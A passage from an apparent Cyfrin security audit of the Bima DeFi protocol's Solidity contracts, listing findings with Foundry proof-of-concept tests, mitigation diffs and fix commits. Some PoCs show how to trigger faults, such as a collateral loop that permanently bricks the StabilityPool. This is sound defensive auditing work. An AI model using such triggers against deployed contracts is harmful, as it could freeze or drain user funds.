Additionally `StabilityPool::enableCollateral` has no limit on the maximum amount of collaterals which can be added.

**Impact:** User functions panic revert and the protocol becomes unusable. Since `StabilityPool::collateralTokens` can never have members removed but only over-written, the protocol is permanently bricked.

**Proof of Concept:** Add the PoC function to `test/foundry/core/StabilityPoolTest.sol`:
```solidity
function test_provideToSP_panicWhen257Collaterals() external {
    for(uint160 i=1; i<=256; i++) {
        address newCollateral = address(i);

        vm.prank(address(factory));
        stabilityPool.enableCollateral(IERC20(newCollateral));
    }

    assertEq(stabilityPool.getNumCollateralTokens(), 257);

    // mint user1 some tokens
    uint256 tokenAmount = 100e18;
    vm.prank(address(borrowerOps));
    debtToken.mint(users.user1, tokenAmount);
    assertEq(debtToken.balanceOf(users.user1), tokenAmount);

    // user1 deposits them into stability pool
    vm.prank(users.user1);
    stabilityPool.provideToSP(tokenAmount);
    // fails with panic: array out-of-bounds access
}
```

Run with: `forge test --match-test test_provideToSP_panicWhen257Collaterals`

**Recommended Mitigation:** Firstly use a named constant which indicates purpose instead of the hard-coded literal 256.

Secondly prevent `StabilityPool::enableCollateral` from adding more than 256 collaterals.

**Bima:**
Fixed in commit [73c1dfd](https://github.com/Bima-Labs/bima-v1-core/commit/73c1dfdefbfe058416008c55c4b2a2817d56ba4d).

**Cyfrin:** Verified.


### `setGuardian` proposals may incorrectly set lower passing percent if current default is greater than hard-coded value for guardian proposals

**Description:** `AdminVoting::createNewProposal` has a check that for `setGuardian` proposals it always uses the hard-coded `SET_GUARDIAN_PASSING_PCT` as the passing percent:

```solidity
if (_containsSetGuardianPayload(payload.length, payload)) {
    // prevent changing guardians during bootstrap period
    require(block.timestamp > startTime + BOOTSTRAP_PERIOD, "Cannot change guardian during bootstrap");

    // enforce 50.1% majority for setGuardian proposals
    proposalPassPct = SET_GUARDIAN_PASSING_PCT;
}
// otherwise for ordinary proposals enforce standard configured passing %
else proposalPassPct = passingPct;
```

The idea is that `setGuardian` proposals are very sensitive proposals and hence should require a 50.1% majority to pass, while other proposals are less sensitive and hence can be passed with a lower proposal percent.

However if the DAO decides to change the default passing percent to be greater than `SET_GUARDIAN_PASSING_PCT`, then `setGuardian` proposals would be created with a lower passing percent than ordinary proposals which is contrary to what is intended.

While setting `proposalPassPct` for a `setGuardian` proposal, we just use `SET_GUARDIAN_PASSING_PCT = 50.1%` without considering the current `passingPct`. It might be dangerous when `passingPct` is greater than `50.1%` due to any unexpected reason.

**Recommended Mitigation:** For `setGuardian` proposals, set the passing percent to whichever is greater of the currently configured passing percent and the hard-coded `SET_GUARDIAN_PASSING_PCT`:
```diff
- proposalPassPct = SET_GUARDIAN_PASSING_PCT;
+ proposalPassPct = BabelMath._max(SET_GUARDIAN_PASSING_PCT, passingPct);
```

**Bima:**
Fixed in commit [7642dc1](https://github.com/Bima-Labs/bima-v1-core/commit/7642dc18201ef5047f9b3ad6119843a15f2d319f).

**Cyfrin:** Verified.


### Prevent panic from division by zero in `BabelBase::_requireUserAcceptsFee`

**Description:** Prevent panic from division by zero in `BabelBase::_requireUserAcceptsFee`:
```diff
function _requireUserAcceptsFee(uint256 _fee, uint256 _amount, uint256 _maxFeePercentage) internal pure {
+   require(_amount > 0, "Amount must be greater than zero");
    uint256 feePercentage = (_fee * BIMA_DECIMAL_PRECISION) / _amount;
    require(feePercentage <= _maxFeePercentage, "Fee exceeded provided maximum");
}
```

**Bima:**
Fixed in commit [fe67023](https://github.com/Bima-Labs/bima-v1-core/commit/fe670238f6290cec1d803dc68160d96592fc5346).

**Cyfrin:** Verified.


### `TokenLocker::withdrawWithPenalty` doesn't reset account bitfield when dust handling results in no remaining locked tokens

**Description:** When users withdraw their locked tokens using `TokenLocker::withdrawWithPenalty`, if after the [dust handling](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L841-L852) the user has no remaining locked tokens then the account's `bitfield` is not correctly reset.

**Impact:** Storage reaches an inconsistent state where `TokenLocker` believes that user as an active lock even though the user has 0 tokens locked. This inconsistent state can spread to `IncentiveVoting` if the user then registers their non-existent account weight. Beyond the inconsistent state there doesn't appear to be a way to further leverage this to do more damage.

**Proof of Concept:** Add the PoC function to `test/foundry/dao/TokenLockerTest.t.sol`:
```solidity
function test_withdrawWithPenalty_activeLockWithZeroLocked() external {
    uint256 amountToLock = 100;
    uint256 weeksToLockFor = 20;

    // first enable penalty withdrawals
    test_setPenaltyWithdrawalsEnabled(0, true);

    // save user initial balance
    uint256 userPreTokenBalance = babelToken.balanceOf(users.user1);

    // perform the lock
    (uint256 lockedAmount, uint256 weeksLockedFor) = test_lock(amountToLock, weeksToLockFor);
    // verify the lock result
    assertEq(lockedAmount, 100);
    assertEq(weeksLockedFor, 20);

    // verify user has received weight in the current week
    uint256 week = tokenLocker.getWeek();
    assertTrue(tokenLocker.getAccountWeightAt(users.user1, week) != 0);

    // perform the withdraw with penalty
    vm.prank(users.user1);
    uint256 amountToWithdraw = 61;
    tokenLocker.withdrawWithPenalty(amountToWithdraw);

    // calculate expected penaltyOnAmount = 61 * 1e18 * (52 - 32) / 32 = 38.125e18
    // so amountToWithdraw + penaltyOnAmount = 99.125e18 and will be 100 after handling dust
    // https://github.com/Bima-Labs/bima-v1-core/blob/main/contracts/dao/TokenLocker.sol#L1080

    // verify account's weight was reset
    assertEq(tokenLocker.getAccountWeightAt(users.user1, week), 0);

    // verify total weight was reset
    assertEq(tokenLocker.getTotalWeight(), 0);

    // getAccountActiveLocks incorrectly shows user still has an active lock
    (ITokenLocker.LockData[] memory activeLockData, uint256 frozenAmount)
        = tokenLocker.getAccountActiveLocks(users.user1, weeksToLockFor);

    assertEq(activeLockData.length, 1); // 1 active lock
    assertEq(frozenAmount, 0);
    assertEq(activeLockData[0].amount, 0); // 0 locked amount
    assertEq(activeLockData[0].weeksToUnlock, weeksToLockFor);

    // user can register with IncentiveVoting even though they have no
    // tokens locked
    vm.prank(users.user1);
    incentiveVoting.registerAccountWeight(users.user1, weeksToLockFor);

    (uint256 frozenWeight, ITokenLocker.LockData[] memory lockData)
        = incentiveVoting.getAccountRegisteredLocks(users.user1);
    assertEq(frozenWeight, 0);
    assertEq(lockData.length, 1);
    assertEq(lockData[0].amount, 0); // 0 locked amount
    assertEq(lockData[0].weeksToUnlock, weeksToLockFor);

    // this results in an inconsistent state but there doesn't appear
    // to be any way to further exploit this state since the locked
    // amount is zero
}
```

Run with: `forge test --match-test test_withdrawWithPenalty_activeLockWithZeroLocked`

**Recommended Mitigation:** `TokenLocker::withdrawWithPenalty` should reset the `bitfield` in case where the dust handling results in the user having no remaining tokens locked:

```diff
      if (lockAmount - penaltyOnAmount > remaining) {
          // then recalculate the penalty using only the portion of the lock
          // amount that will be withdrawn
          penaltyOnAmount = (remaining * MAX_LOCK_WEEKS) / (MAX_LOCK_WEEKS - weeksToUnlock) - remaining;

          // add any dust to the penalty amount
          uint256 dust = ((penaltyOnAmount + remaining) % lockToTokenRatio);
          if (dust > 0) penaltyOnAmount += lockToTokenRatio - dust;

          // update memory total penalty
          penaltyTotal += penaltyOnAmount;

          // calculate amount to reduce lock as penalty + withdrawn amount,
          // scaled down by lockToTokenRatio as those values were prev scaled up by this
          uint256 lockReduceAmount = (penaltyOnAmount + remaining) / lockToTokenRatio;

          // update memory total voting weight reduction
          decreasedWeight += lockReduceAmount * weeksToUnlock;

          // update storage to decrease week's future unlocks
          accountWeeklyUnlocks[msg.sender][systemWeek] -= SafeCast.toUint32(lockReduceAmount);
          totalWeeklyUnlocks[systemWeek] -= SafeCast.toUint32(lockReduceAmount);

+        if (accountWeeklyUnlocks[msg.sender][systemWeek] == 0) {
+            bitfield = bitfield & ~(uint256(1) << (systemWeek % 256));
+         }

          // nothing remaining to be withdrawn
          remaining = 0;
      }
```
**Bima:**
Fixed in commit [1463ba2](https://github.com/Bima-Labs/bima-v1-core/commit/1463ba2cc191a03e9db150e0dbc7ce7f3d1e3777).

**Cyfrin:** Verified.


### `TroveManager::redeemCollateral` can return less collateral tokens than expected due to rounding down to zero precision loss

**Description:** When a user calls `TroveManager::redeemCollateral` with a large enough debt amount such that the:
* first trove is completely exhausted and closed
* remaining debt amount used in the second trove is small

A [rounding down to zero precision loss](https://dacian.me/precision-loss-errors#heading-rounding-down-to-zero) occurs at the collateral [calculation](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/TroveManager.sol#L753):
```solidity
singleRedemption.collateralLot = (singleRedemption.debtLot * BIMA_DECIMAL_PRECISION) / _price;
```

This causes the user to receive no collateral for the remaining debt amount even though it is used to reduce the next trove's debt.

**Impact:** `TroveManager::redeemCollateral` can return less collateral tokens than expected due to rounding down to zero precision loss.

**Proof of Concept:** Add PoC to `test/foundry/core/BorrowerOperationsTest.t.sol`:
```solidity
function test_redeemCollateral_noCollateralForRemainingAmount() external {
    // fast forward time to after bootstrap period
    vm.warp(stakedBTCTroveMgr.systemDeploymentTime() + stakedBTCTroveMgr.BOOTSTRAP_PERIOD());

    // update price oracle response to prevent stale revert
    mockOracle.setResponse(mockOracle.roundId() + 1,
                           mockOracle.answer(),
                           mockOracle.startedAt(),
                           block.timestamp,
                           mockOracle.answeredInRound() + 1);

    // user1 opens a trove with 2 BTC collateral for their max borrowing power
    uint256 collateralAmount = 1e18;

    uint256 debtAmountMax
        = ((collateralAmount * _getScaledOraclePrice() / borrowerOps.CCR())
          - INIT_GAS_COMPENSATION);

    _openTrove(users.user1, collateralAmount, debtAmountMax);

    // user2 opens a trove with 2 BTC collateral for their max borrowing power
    _openTrove(users.user2, collateralAmount, debtAmountMax);

    // mint user3 enough debt tokens such that they will close
    // user1's trove and attempt to redeem part of user2's trove,
    // but the second amount is small enough to trigger a rounding
    // down to zero precision loss in the `singleRedemption.collateralLot`
    // calculation
    uint256 debtToSend = debtAmountMax + 59_999;

    // save a snapshot state before redeem
    uint256 snapshotPreRedeem = vm.snapshot();

    vm.prank(address(borrowerOps));
    debtToken.mint(users.user3, debtToSend);
    assertEq(debtToken.balanceOf(users.user3), debtToSend);
    assertEq(stakedBTC.balanceOf(users.user3), 0);

    // user3 exchanges their debt tokens for collateral
    uint256 maxFeePercent = stakedBTCTroveMgr.maxRedemptionFee();

    vm.prank(users.user3);
    stakedBTCTroveMgr.redeemCollateral(debtToSend,
                                       users.user1, address(0), address(0), 3750000000000000, 0,
                                       maxFeePercent);

    // verify user3 has no debt tokens
    assertEq(debtToken.balanceOf(users.user3), 0);

    // verify user3 received some collateral tokens
    uint256 user3ReceivedCollateralFirst = stakedBTC.balanceOf(users.user3);
    assertTrue(user3ReceivedCollateralFirst > 0);

    // now rewind to snapshot before redeem
    vm.revertTo(snapshotPreRedeem);

    // this time do just enough to close the first trove, without the excess 59_999
    debtToSend = debtAmountMax;

    vm.prank(address(borrowerOps));
    debtToken.mint(users.user3, debtToSend);
    assertEq(debtToken.balanceOf(users.user3), debtToSend);
    assertEq(stakedBTC.balanceOf(users.user3), 0);

    vm.prank(users.user3);
    stakedBTCTroveMgr.redeemCollateral(debtToSend,
                                       users.user1, address(0), address(0), 3750000000000000, 0,
                                       maxFeePercent);

    // verify user3 has no debt tokens
    assertEq(debtToken.balanceOf(users.user3), 0);

    // verify user3 received some collateral tokens
    uint256 user3ReceivedCollateralSecond = stakedBTC.balanceOf(users.user3);
    assertTrue(user3ReceivedCollateralSecond > 0);

    // user3 received the same amount of collateral tokens, even though
    // they redeemed less debt tokens than the first time
    assertEq(user3ReceivedCollateralSecond, user3ReceivedCollateralFirst);
}
```

Run with: `forge test --match-test test_redeemCollateral_noCollateralForRemainingAmount`

**Recommended Mitigation:** `TroveManager::_redeemCollateralFromTrove` should return with `singleRedemption.cancelledPartial = true;` when this rounding down to zero occurs:
```diff
                if (
                    icrError > 5e14 ||
+                   singleRedemption.collateralLot == 0 ||
                    _getNetDebt(newDebt) < IBorrowerOperations(borrowerOperationsAddress).minNetDebt()
                ) {
                    singleRedemption.cancelledPartial = true;
                    return singleRedemption;
                }
```

**Bima:**
Fixed in commit [a6a05fe](https://github.com/Bima-Labs/bima-v1-core/commit/a6a05fe3497cf78fe575b3093ba620d23ad60969).

**Cyfrin:** Verified.


### `StabilityPool` should use per-collateral rounding error compensation

**Description:** Prisma fixed this in commit [0915dd4](https://github.com/prisma-fi/prisma-contracts/commit/0915dd4983ddbafd03601b186f2e1b8eae7dc311#diff-1cba6dc54756d6e48926d14e0933ff37d349c271ae78f2b5f02e85aa8fc9c312R417) noting that _"prior to this commit, owed collateral can deviate by dust amounts. In some cases, the last user to claim collaterals could have their call revert."_

**Recommended Mitigation:** Implement the fix per Prisma's patch.

**Bima:**
Fixed in commit [d437ff5](https://github.com/Bima-Labs/bima-v1-core/commit/d437ff5b0ab0df8ecd0ca6c891d16d1e45850858).

**Cyfrin:** Verified.


### `StabilityPool` reward calculation loses small amounts of vault emission rewards

**Description:** `StabilityPool` can earn token emission rewards from `BabelVault` if users vote for it to do so, and these rewards are distributed to users who deposit into `StabilityPool`. The mechanism for calculating depositors' reward share appears to result in small amounts of lost token emissions.

**Impact:** Not all the weekly token emissions allocated to `StabilityPool` get distributed to depositors; small amounts are never distributed and effectively lost.

**Proof of Concept:** Add the PoC to `test/foundry/core/StabilityPoolTest.t.sol`:
```solidity
function test_claimReward_smallAmountOfStabilityPoolRewardsLost() external {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // user votes for stability pool to get emissions
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = stabilityPool.SP_EMISSION_ID();
    votes[0].points = incentiveVoting.MAX_POINTS();

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // user1 and user 2 both deposit 10K into the stability pool
    uint96 spDepositAmount = 10_000e18;
    _provideToSP(users.user1, spDepositAmount, 1);
    _provideToSP(users.user2, spDepositAmount, 1);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // calculate expected first week emissions
    uint256 firstWeekEmissions = initialUnallocated*INIT_ES_WEEKLY_PCT/BIMA_100_PCT;
    assertTrue(firstWeekEmissions > 0);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // no rewards in the same week as emissions
    vm.prank(users.user1);
    uint256 userReward = stabilityPool.claimReward(users.user1);
    assertEq(userReward, 0);

    // verify emissions correctly set in BabelVault for first week
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // rewards for the first week can be claimed now
    vm.prank(users.user1);
    userReward = stabilityPool.claimReward(users.user1);

    // verify user1 receives half of the emissions
    assertEq(firstWeekEmissions/2, 268435455937500000000000000);
    assertEq(userReward,           268435455937499999999890000);

    // user 2 claims their reward
    vm.prank(users.user2);
    userReward = stabilityPool.claimReward(users.user2);
    assertEq(userReward,           268435455937499999999890000);

    // firstWeekEmissions = 536870911875000000000000000
    // userReward * 2     = 536870911874999999999780000
    //
    // a small amount of rewards was not distributed and is effectively lost
}
```

Run with: `forge test --match-contract StabilityPoolTest --match-test test_claimReward_smallAmountOfStabilityPoolRewardsLost -vvv`

**Recommended Mitigation:** This issue was found towards the end of the audit when filling in missing test suite coverage so the cause has not yet been determined and remains for the protocol team to investigate using the test suite.

**Bima:**
Acknowledged.

\clearpage
## Informational


###  Avoid floating pragma unless creating libraries

**Description:** Per [SWC-103](https://swcregistry.io/docs/SWC-103/) compiler versions in pragmas should be fixed unless creating libraries. Choose a specific compiler version to use for development, testing and deployment, eg:
```diff
- pragma solidity ^0.8.19;
+ pragma solidity 0.8.19;
```

**Bima:**
Fixed in commit [171dacf](https://github.com/Bima-Labs/bima-v1-core/commit/171dacf9a744478cdaeb9bca5366483883cf7bb3).

**Cyfrin:** Resolved.


### Use named imports instead of importing the entire namespace

**Description:** Use named imports as they offer a number of [advantages](https://ethereum.stackexchange.com/a/117173) compared to importing the entire namespace.

**Bima:**
Fixed in commits [171dacf](https://github.com/Bima-Labs/bima-v1-core/commit/171dacf9a744478cdaeb9bca5366483883cf7bb3) and [854a54e](https://github.com/Bima-Labs/bima-v1-core/commit/854a54e833dd536f8112ae0d10f4fa322d81830f).

**Cyfrin:** Verified.


### Use explicit `uint256` instead of generic `uint`

**Description:** Use explicit `uint256` instead of generic `uint`:
```solidity
core/LiquidationManager.sol
163:        uint debtInStabPool = stabilityPoolCached.getTotalDebtTokenDeposits();
167:            uint ICR = troveManager.getCurrentICR(account, troveManagerValues.price);
192:            (uint entireSystemColl, uint entireSystemDebt) = borrowerOperations.getGlobalSystemBalances();
198:                uint ICR = troveManager.getCurrentICR(nextAccount, troveManagerValues.price);
279:        uint debtInStabPool = stabilityPoolCached.getTotalDebtTokenDeposits();
283:        uint troveCount = troveManager.getTroveOwnersCount();
284:        uint length = _troveArray.length;
285:        uint troveIter;
291:            uint ICR = troveManager.getCurrentICR(account, troveManagerValues.price);
320:                uint ICR = troveManager.getCurrentICR(account, troveManagerValues.price);
402:        uint pendingDebtReward;
403:        uint pendingCollReward;
455:        uint entireTroveDebt;
456:        uint entireTroveColl;
457:        uint pendingDebtReward;
458:        uint pendingCollReward;
508:        uint pendingDebtReward;
509:        uint pendingCollReward;

interfaces/IGaugeController.sol
5:    function vote_for_gauge_weights(address gauge, uint weight) external;

interfaces/ILiquidityGauge.sol
7:    function withdraw(uint value) external;

interfaces/IBoostDelegate.sol
26:        uint amount,
27:        uint previousAmount,
28:        uint totalWeeklyEmissions
45:        uint amount,
46:        uint adjustedAmount,
47:        uint fee,
48:        uint previousAmount,
49:        uint totalWeeklyEmissions

dao/InterimAdmin.sol
90:        uint loopEnd = payload.length;

dao/IncentiveVoting.sol
377:            uint amount = frozenWeight / MAX_LOCK_WEEKS;
```

**Bima:**
Fixed in commit [f614678](https://github.com/Bima-Labs/bima-v1-core/commit/f614678e78e5d3dd91682aeca7ae6e881d927052).

**Cyfrin:** Verified.


### Emit events for important parameter changes

**Description:** Emit events for important parameter changes:
```solidity
Factory::setImplementations

BorrowerOperations::_setMinNetDebt
AirdropDistributor::setClaimCallback, sweepUnclaimedTokens
InterimAdmin::setAdminVoting
TokenLocker::setAllowPenaltyWithdrawAfter, setPenaltyWithdrawalsEnabled
DelegatedOps::setDelegateApproval
CurveProxy::setVoteManager, setDepositManager, setPerGaugeApproval
TroveManager::setPaused, setPriceFeed, startSunset, setParameters, collectInterests
```

**Bima:**
Fixed in commits [97320f4](https://github.com/Bima-Labs/bima-v1-core/commit/97320f440af3522e34337336bbf5355cdc574393), [b8d648a](https://github.com/Bima-Labs/bima-v1-core/commit/b8d648a83ebf3747ff41d0aa20172e65adcb0d5a), [6be47c8](https://github.com/Bima-Labs/bima-v1-core/commit/6be47c806dea53901f0c39d42948aa80321486b2), [90adcd4](https://github.com/Bima-Labs/bima-v1-core/commit/90adcd49d826670d1117eb733b2a23d93a306c23), [79b1e07](https://github.com/Bima-Labs/bima-v1-core/commit/79b1e070a4502e68da729136ccee7284d2f1112d), [6cf3857](https://github.com/Bima-Labs/bima-v1-core/commit/6cf3857e2e4e12d009d65743395b831a12db31aa), [87d56fa](https://github.com/Bima-Labs/bima-v1-core/commit/87d56fa1c3bb2b90284b30e5f24e6fea3e0e9517)

**Cyfrin:** Verified.


### Use named mapping parameters

**Description:** Solidity 0.8.18 [introduced](https://soliditylang.org/blog/2023/02/01/solidity-0.8.18-release-announcement/) named `mapping` parameters; use this feature for clearer mappings:
```solidity
PriceFeed.sol
StabilityPool.sol

dao/AdminVoting.sol
dao/AllocationVesting.sol
dao/BoostCalculator.sol
dao/IncentiveVoting.sol
dao/TokenLocker.sol
dao/Vault.sol
```

**Bima:**
Fixed in commit [95c0148](https://github.com/Bima-Labs/bima-v1-core/commit/95c01487339a59ea58a5e47d15eabc929e77174e), [3e68844](https://github.com/Bima-Labs/bima-v1-core/commit/3e68844b35da96a97cdb1f2e6a7c405e5589b805), [97320f4](https://github.com/Bima-Labs/bima-v1-core/commit/97320f440af3522e34337336bbf5355cdc574393), [6fb75f8](https://github.com/Bima-Labs/bima-v1-core/commit/6fb75f8cfe6244335745ab0477b08555990b7ae5), [6a2bd6e](https://github.com/Bima-Labs/bima-v1-core/commit/6a2bd6ec392540d9d484900129fa8ae56796092c), [6d5c17b](https://github.com/Bima-Labs/bima-v1-core/commit/6d5c17ba114a2623879484933567aececa6c8639), [a74cffa](https://github.com/Bima-Labs/bima-v1-core/commit/a74cffa39b644f66f5bd19dbe45358311689b7dc), [305c007](https://github.com/Bima-Labs/bima-v1-core/commit/305c0076552dcb2477b9f9135528b46279446abe), [fde2016](https://github.com/Bima-Labs/bima-v1-core/commit/fde2016d74f1c1a432743179eb6a3c5366df8b35)

**Cyfrin:** Verified.


### Incorrect comment regarding the configuration of `DebtToken::FLASH_LOAN_FEE` parameter

**Description:** `DebtToken::_flashFee` divides by `10000`, hence if `FLASH_LOAN_FEE = 1` then:
```solidity
1/10000 = 0.0001
0.0001 * 100 = 0.01%
```

So the comment indicating that 1 = 0.0001% is incorrect:

```diff
File: DebtToken.sol
- uint256 public constant FLASH_LOAN_FEE = 9; // 1 = 0.0001%
+ uint256 public constant FLASH_LOAN_FEE = 9; // 1 = 0.01%
```

**Bima:**
Fixed in commit [4ae0be3](https://github.com/Bima-Labs/bima-v1-core/commit/4ae0be305e1c87b2c9df89b4676f352d87ded3cf#diff-d399aa6726575b4ec26ffd8ee686529c41769d6d5e5d1918a0ba94d3652c715eR20).

**Cyfrin:** Verified.


### `TokenLocker::withdrawWithPenalty` should revert if nothing is withdrawn

**Description:** `TokenLocker::withdrawWithPenalty` should revert if nothing is withdrawn by first rejecting zero input:
```diff
function withdrawWithPenalty(uint256 amountToWithdraw) external notFrozen(msg.sender) returns (uint256) {
    // penalty withdrawals must be enabled by admin
    require(penaltyWithdrawalsEnabled, "Penalty withdrawals are disabled");

+   // revert on zero input
+   require(amountToWithdraw != 0, "Must withdraw a positive amount");
```

Then after the loop, if the user specified a max withdraw, checking performing a similar check:
```diff
// if users tried to withdraw as much as possible, then subtract
// the "unfilled" net amount (not inc penalties) from the user input
// which gives the "filled" amount (not inc penalties)
if (amountToWithdraw == type(uint256).max) {
    amountToWithdraw -= remaining;

+   // revert if nothing was withdrawn, eg if user had no locked
+   // tokens but attempted withdraw with input type(uint256).max
+   require(amountToWithdraw != 0, "Must withdraw a positive amount");
}
```

**Bima:**
Fixed in commit [b8d648a](https://github.com/Bima-Labs/bima-v1-core/commit/b8d648a83ebf3747ff41d0aa20172e65adcb0d5a#diff-03e38b085efbd92e1efa0bc1816dab9179000258edf449791469ca5833167b71R787-R788).

**Cyfrin:** Verified.


### Enforce > 0 passing percent configuration in `AdminVoting::setPassingPct`

**Description:** Enforce > 0 passing percent configuration in `AdminVoting::setPassingPct`:
```diff
function setPassingPct(uint256 pct) external returns (bool) {
    // enforce this function can only be called by this contract
    require(msg.sender == address(this), "Only callable via proposal");

-   // restrict max value
-   require(pct <= MAX_PCT, "Invalid value");
+   // restrict min & max value
+   require(pct <= MAX_PCT && pct > 0, "Invalid value");
```

**Bima:**
Fixed in commit [065fbb8](https://github.com/Bima-Labs/bima-v1-core/commit/065fbb8368e4800bc52b5d19fff098528bb291bc).

**Cyfrin:** Verified.


### `TokenLocker::freeze` always emits `LocksFrozen` event with 0 amount

**Description:** `TokenLocker::freeze` has a `while` loop that decrements `locked` and only exits when `locked == 0`, then the `LocksFrozen` event is always emitted afterwards with `locked = 0`:
```solidity
uint256 bitfield = accountData.updateWeeks[systemWeek / 256] >> (systemWeek % 256);
// @audit loop only exits when locked == 0
while (locked > 0) {
    systemWeek++;
    if (systemWeek % 256 == 0) {
        bitfield = accountData.updateWeeks[systemWeek / 256];
        accountData.updateWeeks[(systemWeek / 256) - 1] = 0;
    } else {
        bitfield = bitfield >> 1;
    }
    if (bitfield & uint256(1) == 1) {
        uint32 amount = unlocks[systemWeek];
        unlocks[systemWeek] = 0;
        totalWeeklyUnlocks[systemWeek] -= amount;
        // @audit locked decremented
        locked -= amount;
    }
}
accountData.updateWeeks[systemWeek / 256] = 0;
// @audit locked will always be 0 here
emit LocksFrozen(msg.sender, locked);
```

**Recommended Mitigation:** Emit the event before the `while` loop.

**Bima:**
Fixed in commit [c286563](https://github.com/Bima-Labs/bima-v1-core/commit/c286563b4a2e8972659928fd83aba8966603452f).

**Cyfrin:** Verified.


### `BorrowingFeePaid` event should include token that was repaid

**Description:** `BorrowingFeePaid` event should include collateral token that was repaid:
```diff
- event BorrowingFeePaid(address indexed borrower, uint256 amount);
+ event BorrowingFeePaid(address indexed borrower, IERC20 collateralToken, uint256 amount);
```

Then emit the event with the collateral being repaid to easily track via events which collateral tokens were used in repayments.

**Bima:**
Fixed in commit [d50d59e](https://github.com/Bima-Labs/bima-v1-core/commit/d50d59e29cc7ff13027d5967ebd29d7dcceaad59).

**Cyfrin:** Verified.


### `BabelVault::registerReceiver` should check `bool` return when calling `IEmissionReceiver::notifyRegisteredId`

**Description:** `BabelVault::registerReceiver` should check `bool` return when calling `IEmissionReceiver::notifyRegisteredId` since this call is intended as a sanity check to ensure the receiver contract is capable of receiving emissions:
```diff
-   IEmissionReceiver(receiver).notifyRegisteredId(assignedIds);
+   require(IEmissionReceiver(receiver).notifyRegisteredId(assignedIds),
+          "notifyRegisteredId must return true");
```

**Bima:**
Fixed in commit [d8b51bd](https://github.com/Bima-Labs/bima-v1-core/commit/d8b51bdb6ccffbe7dbdf995a98501e7cdd783df1).

**Cyfrin:** Verified.


### Enforce 18 decimal collateral tokens in `Factory::deployNewInstance`

**Description:** The protocol assumes collateral tokens decimals are 18.

**Proof of Concept:** While calculating a `TCR` in [BorrowerOperations::_getTCRData](https://github.com/Bima-Labs/bima-v1-core/blob/main/contracts/core/BorrowerOperations.sol#L583), it uses a raw collateral amount.

```solidity
    function _getTCRData(
        SystemBalances memory balances
    ) internal pure returns (uint256 amount, uint256 totalPricedCollateral, uint256 totalDebt) {
        uint256 loopEnd = balances.collaterals.length;
        for (uint256 i; i < loopEnd; ) {
            totalPricedCollateral += (balances.collaterals[i] * balances.prices[i]);
            totalDebt += balances.debts[i];
            unchecked {
                ++i;
            }
        }
        amount = BabelMath._computeCR(totalPricedCollateral, totalDebt);

        return (amount, totalPricedCollateral, totalDebt);
    }

    function _computeCR(uint256 _coll, uint256 _debt) internal pure returns (uint256) {
        if (_debt > 0) {
            uint256 newCollRatio = (_coll) / _debt;

            return newCollRatio;
        }
        // Return the maximal value for uint256 if the Trove has a debt of 0. Represents "infinite" CR.
        else {
            // if (_debt == 0)
            return 2 ** 256 - 1;
        }
    }
```

It gets `TCR = collaterals * prices / debt` and compares with [CCR](https://github.com/Bima-Labs/bima-v1-core/blob/main/contracts/dependencies/BabelBase.sol#L14) which has 18 decimals.

**Recommended Mitigation:** This is not a problem since all collateral tokens the protocol intends to support have 18 decimals. However when enabling a new collateral in `Factory::deployNewInstance` this should only allow 18 decimal tokens.

**Bima:**
Fixed in commit [ddcad19](https://github.com/Bima-Labs/bima-v1-core/commit/ddcad191ae4aba559d4705a6ff5772694c0fdbd5).

**Cyfrin:** Verified.


### Consolidate `10000`, `MAX_FEE_PCT` and `MAX_PCT` used in many contracts into one shared constant

**Description:** Many contracts throughout the protocol use literal `10000` or have `MAX_PCT` or `MAX_FEE_PCT` constants with this number; consolidate all of these into one shared constant in a new file `/dependencies/Constants.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// represents 100% in BIMA used in denominator when
// calculating amounts based on a percentage
uint256 constant BIMA_100_PCT = 10_000;
```

**Bima:**
Fixed in commit [9259e38](https://github.com/Bima-Labs/bima-v1-core/commit/9259e38587fc8a0f5991061b2aaa95201d9b3373).

**Cyfrin:** Verified.


### Consolidate `DECIMAL_PRECISION` used in three contracts into one shared constant

**Description:** Consolidate `DECIMAL_PRECISION` used in three contracts into one shared constant:
```solidity
core/StabilityPool.sol
21:    uint256 public constant DECIMAL_PRECISION = 1e18;

dependencies/BabelBase.sol
11:    uint256 public constant DECIMAL_PRECISION = 1e18;

dependencies/BabelMath.sol
5:    uint256 internal constant DECIMAL_PRECISION = 1e18;
```

**Bima:**
Fixed in [6812dde](https://github.com/Bima-Labs/bima-v1-core/commit/6812dde8745a3d39d614181f6bfa63547216396a).

**Cyfrin:** Verified.


### Consolidate `SCALE_FACTOR` used in two contracts into one shared constant

**Description:** Consolidate `SCALE_FACTOR` used in two contracts into one shared constant:
```solidity
contracts/core/StabilityPool.sol
30:    uint256 public constant SCALE_FACTOR = 1e9;

contracts/dao/BoostCalculator.sol
59:    uint256 internal constant SCALE_FACTOR = 1e9;
```

**Bima:**
Fixed in commit [1916b7a](https://github.com/Bima-Labs/bima-v1-core/commit/1916b7a63d0445dad22f6299329cdee7578a726b).

**Cyfrin:** Verified.


### Consolidate `REWARD_DURATION` used in four contracts into one shared constant

**Description:** Consolidate `REWARD_DURATION` used in four contracts into one shared constant:
```solidity
core/StabilityPool.sol
26:    uint256 constant REWARD_DURATION = 1 weeks;
399:                rewardRate = SafeCast.toUint128(amount / REWARD_DURATION);
400:                periodFinish = uint32(block.timestamp + REWARD_DURATION);

core/TroveManager.sol
53:    uint256 constant REWARD_DURATION = 1 weeks;
907:        rewardRate = uint128(amount / REWARD_DURATION);
909:        periodFinish = uint32(block.timestamp + REWARD_DURATION);

staking/Curve/CurveDepositToken.sol
48:    uint256 constant REWARD_DURATION = 1 weeks;
249:        rewardRate[0] = SafeCast.toUint128(babelAmount / REWARD_DURATION);
